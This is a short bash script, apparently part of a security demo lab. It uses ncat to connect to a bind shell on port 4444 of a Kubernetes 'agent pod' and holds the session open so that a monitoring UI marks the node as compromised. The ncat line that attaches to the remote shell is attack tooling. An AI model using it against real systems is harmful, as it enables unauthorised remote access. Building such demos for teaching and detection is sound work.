#!/usr/bin/env bash
# Hold an open connection to the bind shell on the agent pod.
# Keeps the connection alive so net-monitor detects "established" state
# and the Neo UI map transitions to the "compromised" phase.
# Press Ctrl+C to disconnect.
set -euo pipefail

if [[ "${1:-}" == "--help" ]]; then
  echo "Usage: hold-shell.sh"
  echo "  Connects to the agent's bind shell and holds the connection open."
  echo "  The Neo UI map will show the attacker node with a connected edge."
  echo "  Press Ctrl+C to disconnect."
  echo ""
  echo "Environment:"
  echo "  AGENT_NS     agent namespace (default: agent-namespace)"
  echo "  BIND_PORT    bind shell port (default: 4444)"
  exit 0
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/lib.sh"

banner "Hold Shell Connection"

AGENT_IP=$(resolve_agent_ip)
echo "  Agent IP:   $AGENT_IP"
echo "  Bind port:  $BIND_PORT"
echo ""
echo "  Checking if bind shell is open..."

if ! ncat -z "$AGENT_IP" "$BIND_PORT" 2>/dev/null; then
  echo "  ERROR: Port $BIND_PORT is not open on $AGENT_IP."
  echo "  Run trigger.sh first, then wait-shell.sh."
  exit 1
fi

echo "  Port $BIND_PORT is open. Connecting... (Ctrl+C to disconnect)"
echo ""

sleep infinity | ncat "$AGENT_IP" "$BIND_PORT" &
NCAT_PID=$!

trap 'kill $NCAT_PID 2>/dev/null; echo ""; echo "  Disconnected."; exit 0' INT TERM

echo "  Connected. Shell is held open."
echo "  Press Ctrl+C to disconnect."
echo ""

wait $NCAT_PID 2>/dev/null
